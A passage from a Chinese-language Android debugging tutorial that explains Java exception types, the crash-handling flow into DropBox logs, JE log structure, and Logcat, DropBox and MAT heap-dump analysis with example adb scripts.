<p><strong>Checked vs Unchecked Exception</strong>:</p>






























<table><thead><tr><th align="left">特性</th><th align="left">Checked Exception</th><th align="left">Unchecked Exception</th></tr></thead><tbody><tr><td align="left">代表类</td><td align="left">IOException, SQLException</td><td align="left">RuntimeException及其子类</td></tr><tr><td align="left">编译检查</td><td align="left">必须try-catch或throws</td><td align="left">不需要</td></tr><tr><td align="left">发生时机</td><td align="left">可预见的外部因素</td><td align="left">编程错误</td></tr><tr><td align="left">示例</td><td align="left">文件不存在、网络中断</td><td align="left">空指针、数组越界</td></tr></tbody></table>
<h4 data-id="heading-4">1.2 Android中的Java异常处理</h4>
<p>Android系统对Java异常有一套完整的处理机制:</p>
<p><strong>异常捕获流程</strong>:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. 线程抛出未捕获异常</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> Thread.currentThread();

<span class="hljs-comment">// 2. 触发UncaughtExceptionHandler</span>
<span class="hljs-type">UncaughtExceptionHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> thread.getUncaughtExceptionHandler();
handler.uncaughtException(thread, exception);

<span class="hljs-comment">// 3. 系统默认处理器: RuntimeInit$KillApplicationHandler</span>
<span class="hljs-comment">// - 记录异常日志到Logcat</span>
<span class="hljs-comment">// - 通过Binder调用AMS上报异常</span>
<span class="hljs-comment">// - AMS记录到DropBox</span>
<span class="hljs-comment">// - 杀死应用进程</span>
</code></pre>
<p><strong>关键组件</strong>:</p>
<ol>
<li>
<p><strong>UncaughtExceptionHandler</strong>: 异常拦截器</p>
<pre><code class="hljs language-java" lang="java">Thread.setDefaultUncaughtExceptionHandler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">UncaughtExceptionHandler</span>() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">uncaughtException</span><span class="hljs-params">(Thread t, Throwable e)</span> {
        <span class="hljs-comment">// 自定义处理逻辑</span>
        Log.e(TAG, <span class="hljs-string">"Uncaught exception in thread "</span> + t.getName(), e);
        <span class="hljs-comment">// 上报到监控平台</span>
        CrashReporter.report(e);
    }
});
</code></pre>
</li>
<li>
<p><strong>ActivityThread</strong>: 应用主线程的异常处理入口</p>
</li>
<li>
<p><strong>ActivityManagerService</strong>: 系统服务,负责异常收集和进程管理</p>
</li>
<li>
<p><strong>DropBoxManagerService</strong>: 异常日志持久化服务</p>
</li>
</ol>
<h4 data-id="heading-5">1.3 常见的Java异常类型</h4>
<p>在Android系统开发中,以下异常最为常见:</p>
<p><strong>Top 5 高频异常</strong>:</p>









































<table><thead><tr><th align="left">异常类型</th><th align="center">占比</th><th align="left">常见原因</th><th align="left">典型场景</th></tr></thead><tbody><tr><td align="left"><strong>NullPointerException</strong></td><td align="center">35%</td><td align="left">对象为null时调用方法或访问字段</td><td align="left">未初始化的变量、回调中的空对象</td></tr><tr><td align="left"><strong>IndexOutOfBoundsException</strong></td><td align="center">15%</td><td align="left">访问数组/列表时索引超出范围</td><td align="left">循环边界错误、数据不一致</td></tr><tr><td align="left"><strong>ClassCastException</strong></td><td align="center">12%</td><td align="left">强制类型转换失败</td><td align="left">泛型擦除、多态使用错误</td></tr><tr><td align="left"><strong>IllegalStateException</strong></td><td align="center">10%</td><td align="left">对象状态不正确时调用方法</td><td align="left">Activity生命周期错误</td></tr><tr><td align="left"><strong>IllegalArgumentException</strong></td><td align="center">8%</td><td align="left">方法参数不合法</td><td align="left">参数校验失败</td></tr></tbody></table>
<p><strong>示例代码</strong>:</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// NPE示例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CarPropertyManager</span> {
    <span class="hljs-keyword">private</span> ICarProperty mService;  <span class="hljs-comment">// 可能为null</span>

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getProperty</span><span class="hljs-params">(<span class="hljs-type">int</span> propertyId)</span> {
        <span class="hljs-comment">// 没有检查mService是否为null!</span>
        <span class="hljs-keyword">return</span> mService.getIntProperty(propertyId, <span class="hljs-number">0</span>);  <span class="hljs-comment">// NPE!</span>
    }
}

<span class="hljs-comment">// IndexOutOfBoundsException示例</span>
List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
list.add(<span class="hljs-string">"item1"</span>);
<span class="hljs-type">String</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> list.get(<span class="hljs-number">5</span>);  <span class="hljs-comment">// 越界!</span>

<span class="hljs-comment">// ClassCastException示例</span>
<span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">10</span>);
<span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> (String) obj;  <span class="hljs-comment">// 类型转换失败!</span>

<span class="hljs-comment">// IllegalStateException示例</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
    <span class="hljs-built_in">super</span>.onDestroy();
    <span class="hljs-comment">// Activity已销毁</span>
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateUI</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (isDestroyed()) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">"Activity is destroyed"</span>);
    }
    <span class="hljs-comment">// 更新UI</span>
}
</code></pre>
<p>下图展示了Java异常从抛出到写入DropBox日志的完整处理流程:</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/135a76248e784151aceb92a63b645d04~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767841506&amp;x-signature=ySnbLkJ6chwARZuNsy7PmTNdLiQ%3D" alt="06-01-java-exception-flow.png" loading="lazy"/>
<em>图1: Java异常处理流程 - 从应用异常到日志存储的完整链路</em></p>
<hr/>
<h3 data-id="heading-6">二、JE (Java Exception) 日志深度解析</h3>
<p>JE (Java Exception) 是Android系统中Java层异常的统称,理解JE日志的结构是分析问题的基础。</p>
<h4 data-id="heading-7">2.1 JE日志的生成与存储</h4>
<p><strong>生成流程</strong>:</p>
<pre><code class="hljs language-text" lang="text">应用抛出异常
    ↓
UncaughtExceptionHandler捕获
    ↓
写入Logcat (AndroidRuntime: FATAL EXCEPTION)
    ↓
通过Binder IPC上报到AMS
    ↓
AMS调用DropBoxManagerService
    ↓
写入/data/system/dropbox/
    ↓
标记为data_app_crash类型
</code></pre>
<p><strong>存储位置</strong>:</p>
<pre><code class="hljs language-text" lang="text">/data/system/dropbox/
├── data_app_crash@1234567890123.txt        # Java异常
├── data_app_native_crash@1234567890124.txt # Native崩溃
├── data_app_anr@1234567890125.txt          # ANR
└── system_app_crash@1234567890126.txt      # 系统应用崩溃
</code></pre>
<p><strong>日志命名规则</strong>:</p>
<pre><code class="hljs language-diff" lang="diff">&lt;类型&gt;@&lt;时间戳&gt;.txt
<span class="hljs-deletion">- 类型: data_app_crash (三方应用)</span>
       system_app_crash (系统应用)
<span class="hljs-deletion">- 时间戳: System.currentTimeMillis()</span>
</code></pre>
<h4 data-id="heading-8">2.2 JE日志结构剖析</h4>
<p>一个完整的JE日志包含以下几个部分:</p>
<p><strong>完整示例</strong>:</p>
<pre><code class="hljs language-text" lang="text">Process: com.example.carapp
PID: 12345
Flags: 0x38d83e44
Package: com.example.carapp v1 (1.0.0)
Foreground: Yes
Build: PRODUCT/venus/venus:12/SP1A.210812.016/eng.user.20241229:userdebug/dev-keys

java.lang.NullPointerException: Attempt to invoke interface method 'int android.car.hardware.property.ICarProperty.getIntProperty(int, int)' on a null object reference
    at com.example.carapp.CarPropertyManager.getProperty(CarPropertyManager.java:123)
    at com.example.carapp.MainActivity.onCreate(MainActivity.java:56)
    at android.app.Activity.performCreate(Activity.java:8051)
    at android.app.Activity.performCreate(Activity.java:8031)
    at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1329)
    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:3608)
    at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:3792)
    at android.app.servertransaction.LaunchActivityItem.execute(LaunchActivityItem.java:101)
    at android.app.servertransaction.TransactionExecutor.executeCallbacks(TransactionExecutor.java:135)
    at android.app.servertransaction.TransactionExecutor.execute(TransactionExecutor.java:95)
    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2307)
    at android.os.Handler.dispatchMessage(Handler.java:106)
    at android.os.Looper.loopOnce(Looper.java:201)
    at android.os.Looper.loop(Looper.java:288)
    at android.app.ActivityThread.main(ActivityThread.java:7842)
    at java.lang.reflect.Method.invoke(Native Method)
    at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:548)
    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1003)
</code></pre>
<p><strong>各部分详解</strong>:</p>
<p><strong>1. 进程信息</strong> (Process Info):</p>
<pre><code class="hljs language-text" lang="text">Process: com.example.carapp        # 进程名/包名
PID: 12345                         # 进程ID
Flags: 0x38d83e44                  # ApplicationInfo flags
Package: ... v1 (1.0.0)            # 应用版本
Foreground: Yes                    # 是否前台应用
Build: ...                         # 系统构建信息
</code></pre>
<p><strong>2. 异常头</strong> (Exception Header):</p>
<pre><code class="hljs language-text" lang="text">java.lang.NullPointerException: Attempt to invoke interface method '...' on a null object reference
    └─ 异常类型              └─ 异常详细信息(message)
</code></pre>
<p><strong>3. 异常栈</strong> (Stack Trace):</p>
<pre><code class="hljs language-text" lang="text">at 类名.方法名(文件名:行号)
</code></pre>
<p>每一行代表一个方法调用,从上到下是<strong>从问题点到调用入口</strong>的顺序。</p>
<p><strong>关键信息提取</strong>:</p>








































<table><thead><tr><th align="left">信息</th><th align="left">位置</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">异常类型</td><td align="left">第一行</td><td align="left">判断问题性质(NPE/OOM等)</td></tr><tr><td align="left">异常消息</td><td align="left">第一行冒号后</td><td align="left">了解具体错误原因</td></tr><tr><td align="left">崩溃点</td><td align="left">第一个<code>at</code>行</td><td align="left">问题发生的具体位置</td></tr><tr><td align="left">调用链</td><td align="left">完整stack trace</td><td align="left">理解代码执行路径</td></tr><tr><td align="left">应用版本</td><td align="left">Package行</td><td align="left">确认问题版本</td></tr><tr><td align="left">前后台状态</td><td align="left">Foreground行</td><td align="left">判断用户感知程度</td></tr></tbody></table>
<h4 data-id="heading-9">2.3 链式异常分析 (Caused by)</h4>
<p>有时异常会有多层嵌套,使用<code>Caused by</code>连接:</p>
<pre><code class="hljs language-text" lang="text">java.lang.RuntimeException: Unable to start activity ComponentInfo{...}
    at android.app.ActivityThread.performLaunchActivity(...)
    at android.app.ActivityThread.handleLaunchActivity(...)
    ...
Caused by: java.lang.NullPointerException: Attempt to read from field 'int com.example.Config.timeout' on a null object reference
    at com.example.carapp.MainActivity.initConfig(MainActivity.java:89)
    at com.example.carapp.MainActivity.onCreate(MainActivity.java:56)
    ...
</code></pre>
<p><strong>分析方法</strong>:</p>
<ol>
<li><strong>从下往上看</strong> - 最底层的<code>Caused by</code>是根本原因</li>
<li><strong>关注第一个<code>at</code></strong> - 每层异常的第一个<code>at</code>是该层的直接原因</li>
<li><strong>建立因果链</strong> - 理解各层异常的触发关系</li>
</ol>
<p>在这个例子中:</p>
<ul>
<li><strong>根本原因</strong>: <code>Config.timeout</code>字段为null</li>
<li><strong>直接后果</strong>: MainActivity初始化失败</li>
<li><strong>最终表现</strong>: Activity启动失败,应用崩溃</li>
</ul>
<p>下图展示了JE日志文件的完整结构,帮助你快速理解DropBox中crash日志的组成:</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f2935eb4d3b4731ac6b418477e233a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767841506&amp;x-signature=0S%2B409QEx0xPDeZ5Ck%2Bt6HwH0VY%3D" alt="06-02-je-log-structure.png" loading="lazy"/>
<em>图2: JE日志文件结构 - DropBox日志的6大核心Section</em></p>
<hr/>
<h3 data-id="heading-10">三、工具实战1: Logcat实时监控</h3>
<p>Logcat是Android开发中最常用的日志工具,掌握高效的过滤技巧能大幅提升排查效率。</p>
<h4 data-id="heading-11">3.1 Logcat过滤技巧</h4>
<p><strong>基本语法</strong>:</p>
<pre><code class="hljs language-bash" lang="bash">adb logcat [options] [filterspecs]
</code></pre>
<p><strong>1. 按标签过滤Java异常</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 只看FATAL级别的异常</span>
adb logcat *:F

<span class="hljs-comment"># 只看AndroidRuntime标签(包含Java异常)</span>
adb logcat AndroidRuntime:E *:S

<span class="hljs-comment"># 组合过滤</span>
adb logcat AndroidRuntime:E System.err:W *:S
</code></pre>
<p><strong>2. 使用grep进行二次过滤</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 只看NPE</span>
adb logcat | grep -A 30 <span class="hljs-string">"NullPointerException"</span>

<span class="hljs-comment"># 只看特定包名的异常</span>
adb logcat | grep -A 30 <span class="hljs-string">"com.example.carapp"</span>

<span class="hljs-comment"># 排除某些内容</span>
adb logcat | grep -v <span class="hljs-string">"Debug"</span>
</code></pre>
<p><strong>3. 正则表达式搜索</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查找所有Exception</span>
adb logcat | grep -E <span class="hljs-string">"(Exception|Error)"</span>

<span class="hljs-comment"># 查找特定方法调用</span>
adb logcat | grep -E <span class="hljs-string">"at com\.example\..*\.onCreate"</span>
</code></pre>
<p><strong>4. 输出到文件便于分析</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 持续写入文件</span>
adb logcat &gt; crash.log

<span class="hljs-comment"># 限制文件大小和数量(循环日志)</span>
adb logcat -v time -f /sdcard/logcat.txt -r 10240 -n 10
<span class="hljs-comment"># -r: 每个文件10MB</span>
<span class="hljs-comment"># -n: 最多10个文件</span>
</code></pre>
<h4 data-id="heading-12">3.2 实战演示</h4>
<p><strong>场景</strong>: 监控应用启动过程中的异常</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># monitor_crash.sh - 实时监控Java异常</span>

PACKAGE=<span class="hljs-string">"com.example.carapp"</span>
LOG_FILE=<span class="hljs-string">"crash_<span class="hljs-subst">$(date +%Y%m%d_%H%M%S)</span>.log"</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"开始监控 <span class="hljs-variable">$PACKAGE</span> 的Java异常..."</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"日志保存到: <span class="hljs-variable">$LOG_FILE</span>"</span>

<span class="hljs-comment"># 清除旧日志</span>
adb logcat -c

<span class="hljs-comment"># 监控异常并保存</span>
adb logcat -v time AndroidRuntime:E *:S | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line; <span class="hljs-keyword">do</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$line</span>"</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$LOG_FILE</span>"</span>

    <span class="hljs-comment"># 检测到FATAL EXCEPTION时发送通知</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$line</span>"</span> | grep -q <span class="hljs-string">"FATAL EXCEPTION"</span>; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"========================================"</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$LOG_FILE</span>"</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"检测到崩溃!时间: <span class="hljs-subst">$(date)</span>"</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$LOG_FILE</span>"</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"========================================"</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$LOG_FILE</span>"</span>

        <span class="hljs-comment"># 可以在这里添加通知逻辑</span>
        <span class="hljs-comment"># notify-send "检测到应用崩溃" "$line"</span>
    <span class="hljs-keyword">fi</span>
<span class="hljs-keyword">done</span>
</code></pre>
<p><strong>输出示例</strong>:</p>
<pre><code class="hljs language-text" lang="text">12-30 14:23:45.123  1234  1234 E AndroidRuntime: FATAL EXCEPTION: main
12-30 14:23:45.123  1234  1234 E AndroidRuntime: Process: com.example.carapp, PID: 1234
12-30 14:23:45.123  1234  1234 E AndroidRuntime: java.lang.NullPointerException: ...
12-30 14:23:45.124  1234  1234 E AndroidRuntime:     at com.example.carapp.MainActivity.onCreate(MainActivity.java:56)
========================================
检测到崩溃!时间: 2025-12-30 14:23:45
========================================
</code></pre>
<p><strong>技巧总结</strong>:</p>



































<table><thead><tr><th align="left">场景</th><th align="left">命令</th><th/></tr></thead><tbody><tr><td align="left">实时监控Java异常</td><td align="left"><code>adb logcat AndroidRuntime:E *:S</code></td><td/></tr><tr><td align="left">查看最近的异常</td><td align="left">`adb logcat -d</td><td>grep -A 30 "FATAL EXCEPTION"`</td></tr><tr><td align="left">监控特定包</td><td align="left">`adb logcat</td><td>grep "com.example"`</td></tr><tr><td align="left">保存到文件</td><td align="left"><code>adb logcat &gt; crash.log</code></td><td/></tr><tr><td align="left">按时间过滤</td><td align="left">`adb logcat -v time</td><td>grep "14:23"`</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-13">四、工具实战2: DropBox日志分析</h3>
<p>DropBox是Android系统的异常日志持久化服务,历史异常都存储在这里。</p>
<h4 data-id="heading-14">4.1 DropBox日志提取</h4>
<p><strong>方法1: 使用adb pull</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 拉取所有DropBox日志</span>
adb pull /data/system/dropbox ./dropbox_logs/

<span class="hljs-comment"># 只拉取Java异常日志</span>
adb shell <span class="hljs-string">"ls /data/system/dropbox/data_app_crash*"</span> | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> file; <span class="hljs-keyword">do</span>
    adb pull <span class="hljs-string">"<span class="hljs-variable">$file</span>"</span> ./je_logs/
<span class="hljs-keyword">done</span>
</code></pre>
<p><strong>方法2: 使用dumpsys命令</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看所有DropBox日志列表</span>
adb shell dumpsys dropbox

<span class="hljs-comment"># 查看特定类型的日志</span>
adb shell dumpsys dropbox --<span class="hljs-built_in">print</span> data_app_crash

<span class="hljs-comment"># 按时间范围筛选(最近1小时)</span>
adb shell dumpsys dropbox --<span class="hljs-built_in">print</span> data_app_crash --time 3600000

<span class="hljs-comment"># 导出最新的一条Java异常</span>
adb shell dumpsys dropbox --<span class="hljs-built_in">print</span> data_app_crash | <span class="hljs-built_in">head</span> -n 100 &gt; latest_crash.txt
</code></pre>
<p><strong>dumpsys dropbox输出格式</strong>:</p>
<pre><code class="hljs language-text" lang="text">Drop box contents: 156 entries
Max entries: 1000

2025-12-30 14:23:45 data_app_crash (text, 12345 bytes)
    Process: com.example.carapp
    ...

2025-12-30 13:15:32 data_app_anr (text, 45678 bytes)
    Subject: ANR in com.example.carapp
    ...
</code></pre>
<h4 data-id="heading-15">4.2 批量分析脚本</h4>
<p><strong>脚本1: 统计异常类型分布</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># analyze_crashes.sh - 分析DropBox中的Java异常</span>

DROPBOX_DIR=<span class="hljs-string">"/data/system/dropbox"</span>
OUTPUT_FILE=<span class="hljs-string">"crash_analysis_<span class="hljs-subst">$(date +%Y%m%d)</span>.txt"</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"正在分析DropBox日志..."</span> | <span class="hljs-built_in">tee</span> <span class="hljs-string">"<span class="hljs-variable">$OUTPUT_FILE</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"======================================"</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$OUTPUT_FILE</span>"</span>

<span class="hljs-comment"># 统计各类异常的数量</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$OUTPUT_FILE</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"异常类型分布:"</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$OUTPUT_FILE</span>"</span>
adb shell <span class="hljs-string">"grep -h 'java\.lang\.*Exception' <span class="hljs-variable">$DROPBOX_DIR</span>/data_app_crash* | awk '{print \$1}' | sort | uniq -c | sort -rn"</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$OUTPUT_FILE</span>"</span>

<span class="hljs-comment"># 统计最频繁崩溃的包</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$OUTPUT_FILE</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Top 10 崩溃包名:"</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$OUTPUT_FILE</span>"</span>
adb shell <span class="hljs-string">"grep -h '^Process:' <span class="hljs-variable">$DROPBOX_DIR</span>/data_app_crash* | awk '{print \$2}' | sort | uniq -c | sort -rn | head -10"</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$OUTPUT_FILE</span>"</span>

<span class="hljs-comment"># 统计最近24小时的崩溃趋势</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$OUTPUT_FILE</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"最近24小时崩溃趋势:"</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$OUTPUT_FILE</span>"</span>
adb shell <span class="hljs-string">"find <span class="hljs-variable">$DROPBOX_DIR</span> -name 'data_app_crash*' -mtime -1 | wc -l"</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$OUTPUT_FILE</span>"</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">""</span> | <span class="hljs-built_in">tee</span> -a <span class="hljs-string">"<span class="hljs-variable">$OUTPUT_FILE</span>"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"分析完成!结果保存到: <span class="hljs-variable">$OUTPUT_FILE</span>"</span>
</code></pre>
<p><strong>输出示例</strong>:</p>
<pre><code class="hljs language-text" lang="text">正在分析DropBox日志...
======================================

异常类型分布:
     42 java.lang.NullPointerException
     15 java.lang.IndexOutOfBoundsException
     12 java.lang.ClassCastException
      8 java.lang.IllegalStateException
      5 java.lang.RuntimeException

Top 10 崩溃包名:
     35 com.example.carapp
     12 com.android.systemui
      8 com.example.settings
      5 com.android.phone

最近24小时崩溃趋势:
82

分析完成!结果保存到: crash_analysis_20251230.txt
</code></pre>
<p><strong>脚本2: 提取特定包名的所有异常</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># extract_package_crashes.sh</span>

PACKAGE=<span class="hljs-string">"com.example.carapp"</span>
OUTPUT_DIR=<span class="hljs-string">"crashes_<span class="hljs-variable">$PACKAGE</span>"</span>

<span class="hljs-built_in">mkdir</span> -p <span class="hljs-string">"<span class="hljs-variable">$OUTPUT_DIR</span>"</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"提取 <span class="hljs-variable">$PACKAGE</span> 的所有崩溃日志..."</span>

<span class="hljs-comment"># 遍历所有data_app_crash文件</span>
adb shell <span class="hljs-string">"ls /data/system/dropbox/data_app_crash*"</span> | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> file; <span class="hljs-keyword">do</span>
    <span class="hljs-comment"># 检查是否包含目标包名</span>
    <span class="hljs-keyword">if</span> adb shell <span class="hljs-string">"grep -q 'Process: <span class="hljs-variable">$PACKAGE</span>' <span class="hljs-variable">$file</span>"</span>; <span class="hljs-keyword">then</span>
        filename=$(<span class="hljs-built_in">basename</span> <span class="hljs-string">"<span class="hljs-variable">$file</span>"</span>)
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"找到: <span class="hljs-variable">$filename</span>"</span>
        adb pull <span class="hljs-string">"<span class="hljs-variable">$file</span>"</span> <span class="hljs-string">"<span class="hljs-variable">$OUTPUT_DIR</span>/<span class="hljs-variable">$filename</span>"</span>
    <span class="hljs-keyword">fi</span>
<span class="hljs-keyword">done</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"提取完成!保存到目录: <span class="hljs-variable">$OUTPUT_DIR</span>"</span>
<span class="hljs-built_in">ls</span> -lh <span class="hljs-string">"<span class="hljs-variable">$OUTPUT_DIR</span>"</span>
</code></pre>
<hr/>
<h3 data-id="heading-16">五、工具实战3: MAT内存分析</h3>
<p>对于OOM(OutOfMemoryError)和内存相关的异常,MAT (Memory Analyzer Tool) 是最强大的分析工具。</p>
<h4 data-id="heading-17">5.1 Heap Dump获取</h4>
<p><strong>方法1: 通过Android Studio</strong></p>
<pre><code class="hljs language-text" lang="text">1. 打开Android Profiler
2. 选择Memory
3. 点击"Dump Java heap"按钮
4. 自动生成.hprof文件并打开
</code></pre>
<p><strong>方法2: 通过adb命令</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 获取目标应用的PID</span>
adb shell ps | grep com.example.carapp

<span class="hljs-comment"># 触发heap dump</span>
adb shell am dumpheap &lt;PID&gt; /data/local/tmp/heap.hprof

<span class="hljs-comment"># 拉取到本地</span>
adb pull /data/local/tmp/heap.hprof .

<span class="hljs-comment"># 转换格式(MAT需要标准格式)</span>
hprof-conv heap.hprof heap-mat.hprof
</code></pre>
<p><strong>方法3: 代码中主动dump</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryMonitor</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dumpHeap</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Environment.getExternalStorageDirectory()
                + <span class="hljs-string">"/heap_"</span> + System.currentTimeMillis() + <span class="hljs-string">".hprof"</span>;
            Debug.dumpHprofData(path);
            Log.i(TAG, <span class="hljs-string">"Heap dump saved to: "</span> + path);
        } <span class="hljs-keyword">catch</span> (IOException e) {
            Log.e(TAG, <span class="hljs-string">"Failed to dump heap"</span>, e);
        }
    }

    <span class="hljs-comment">// 在怀疑内存泄漏时调用</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkMemoryLeak</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();
        <span class="hljs-type">long</span> <span class="hljs-variable">maxMemory</span> <span class="hljs-operator">=</span> runtime.maxMemory() / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span>;  <span class="hljs-comment">// MB</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">usedMemory</span> <span class="hljs-operator">=</span> (runtime.totalMemory() - runtime.freeMemory()) / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span>;

        <span class="hljs-keyword">if</span> (usedMemory &gt; maxMemory * <span class="hljs-number">0.9</span>) {  <span class="hljs-comment">// 使用率超过90%</span>
            Log.w(TAG, <span class="hljs-string">"Memory usage high: "</span> + usedMemory + <span class="hljs-string">"MB / "</span> + maxMemory + <span class="hljs-string">"MB"</span>);
            dumpHeap();  <span class="hljs-comment">// 主动dump</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-18">5.2 MAT分析技巧</h4>
<p><strong>核心视图</strong>:</p>
<p><strong>1. Histogram (直方图)</strong> - 查看所有对象的数量</p>
<pre><code class="hljs language-text" lang="text">打开: 点击工具栏的"Histogram"图标

作用: 统计每个类的实例数量和占用内存

常用操作:
- 按"Shallow Heap"排序 → 找占用内存最多的类
- 按"Objects"排序 → 找实例数量最多的类
- 右键 → "List objects" → "with incoming references" → 查看谁持有这些对象
</code></pre>
<p><strong>2. Dominator Tree (支配树)</strong> - 查找内存泄漏</p>
<pre><code class="hljs language-text" lang="text">打开: 点击工具栏的"Dominator Tree"图标

作用: 显示对象的支配关系,找出占用内存最大的对象链

内存泄漏特征:
- 某个对象的Retained Heap特别大
- 该对象理应被回收但仍存在
- 通过"Path to GC Roots"查看引用链
</code></pre>
<p><strong>3. OQL (Object Query Language)</strong> - 对象查询</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 查找所有Activity实例</span>
